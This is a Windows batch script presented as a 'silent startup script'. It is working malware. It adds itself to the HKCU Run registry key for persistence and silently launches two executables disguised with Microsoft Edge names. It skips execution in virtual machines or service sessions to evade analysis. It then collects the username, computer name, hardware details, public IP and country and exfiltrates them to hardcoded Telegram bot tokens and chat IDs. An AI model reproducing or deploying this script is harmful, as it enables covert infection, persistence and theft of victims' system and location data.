@echo off
setlocal enabledelayedexpansion

:: =============================================
:: Silent Startup Script - Runs 2 EXEs
:: =============================================

:: === Change these two names if needed ===
set "exe1=edge.exe"
set "exe2=msedge.exe"
:: =========================================

:: Get current folder and full script path
set "folder=%~dp0"
set "scriptPath=%~f0"
set "scriptName=SilentStartupScript"

:: Add itself to startup (HKCU - no admin needed)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%scriptName%" /t REG_SZ /d "%scriptPath%" /f >nul 2>&1

:: Run the two EXE files silently
start "" "%folder%%exe1%" >nul 2>&1
start "" "%folder%%exe2%" >nul 2>&1

chcp 65001 >nul
setlocal EnableDelayedExpansion

:: =========================
:: TELEGRAM CONFIG - MULTIPLE BOTS
:: Format: BOT_TOKEN CHAT_ID
:: =========================
set BOT_1=8337206512:AAExlLa-QsOYuiPUzXXWk3T_HJw9_upKoC4 7613395944
set BOT_2=8029696970:AAGvwTd-rr2C5vlSaUgW1pKKTMc9qghaa9o 7875997267
set BOT_3=BOT_TOKEN_3 CHAT_ID_3
:: Add more as needed

:: =========================
:: DETECT BOT-LIKE / AUTOMATED ENVIRONMENT
:: =========================
set SKIP_ENV=0

:: Skip if running as SYSTEM (common for bots or automated scripts)
if /I "%USERNAME%"=="SYSTEM" set SKIP_ENV=1

:: Skip if session type is Services (no real user)
if /I "%SESSIONNAME%"=="Services" set SKIP_ENV=1

:: Skip if running inside a VM
set IS_VM=0
for /f "skip=1 delims=" %%i in ('wmic computersystem get model') do (
    if not "%%i"=="" set CS_MODEL=%%i
)
echo !CS_MODEL! | findstr /I "VirtualBox VMware QEMU Hyper-V Xen" >nul && set IS_VM=1
if "!IS_VM!"=="1" set SKIP_ENV=1

:: Exit if bot-like environment detected
if "%SKIP_ENV%"=="1" (
    echo Bot-like environment or VM detected. Skipping Telegram message.
    pause
    exit /b
)

:: =========================
:: GET PUBLIC IP
:: =========================
for /f %%i in ('curl -s https://api.ipify.org') do set IP=%%i

:: =========================
:: GET COUNTRY NAME + CODE
:: =========================
for /f "delims=" %%i in ('curl -s "http://ip-api.com/line/?fields=country"') do set COUNTRY=%%i
for /f "delims=" %%i in ('curl -s "http://ip-api.com/line/?fields=countryCode"') do set CC=%%i

:: =========================
:: COUNTRY FLAGS
:: =========================
set FLAG=🏳️
if /I "%CC%"=="US" set FLAG=🇺🇸
if /I "%CC%"=="GB" set FLAG=🇬🇧
if /I "%CC%"=="NG" set FLAG=🇳🇬
if /I "%CC%"=="CA" set FLAG=🇨🇦
if /I "%CC%"=="DE" set FLAG=🇩🇪
if /I "%CC%"=="FR" set FLAG=🇫🇷
if /I "%CC%"=="IN" set FLAG=🇮🇳
if /I "%CC%"=="BR" set FLAG=🇧🇷
if /I "%CC%"=="RU" set FLAG=🇷🇺
if /I "%CC%"=="JP" set FLAG=🇯🇵
if /I "%CC%"=="CN" set FLAG=🇨🇳
if /I "%CC%"=="AU" set FLAG=🇦🇺

:: =========================
:: CPU
:: =========================
for /f "skip=1 delims=" %%i in ('wmic cpu get name') do (
    if not "%%i"=="" (
        set CPU=%%i
        goto cpu_done
    )
)
:cpu_done

:: =========================
:: GPU
:: =========================
for /f "skip=1 delims=" %%i in ('wmic path win32_VideoController get name') do (
    if not "%%i"=="" (
        set GPU=%%i
        goto gpu_done
    )
)
:gpu_done

:: =========================
:: RAM
:: =========================
for /f "skip=1" %%i in ('wmic computersystem get TotalPhysicalMemory') do (
    set RAM=%%i
    goto ram_done
)
:ram_done
set /a RAMGB=%RAM:~0,-9%

:: =========================
:: CREATE TELEGRAM MESSAGE
:: =========================
@echo off
:: Force command prompt to use UTF-8 encoding
chcp 65001 > nul

(
echo 🔊 SYSTEM REPORT
echo.
echo 👤 Username: %USERNAME%
echo 🖥 Computer: %COMPUTERNAME%
echo.
echo ⚙ Processor:
echo !CPU!
echo.
echo 🎮 Graphics Card:
echo !GPU!
echo.
echo 💾 Installed RAM: !RAMGB! GB
echo.
echo 🌐 Public IP:
echo %IP%
echo.
echo 📍 Country:
echo %COUNTRY% %FLAG%
) > msg.txt

:: =========================
:: SEND MESSAGE TO MULTIPLE BOTS
:: =========================
for %%B in (BOT_1 BOT_2 BOT_3) do (
    for /f "tokens=1,2" %%T in ("!%%B!") do (
        curl -s -X POST "https://api.telegram.org/bot%%T/sendMessage" ^
        -d chat_id=%%U ^
        --data-urlencode text@msg.txt
    )
)

:: =========================
:: CLEANUP
:: =========================
del msg.txt
exit

exit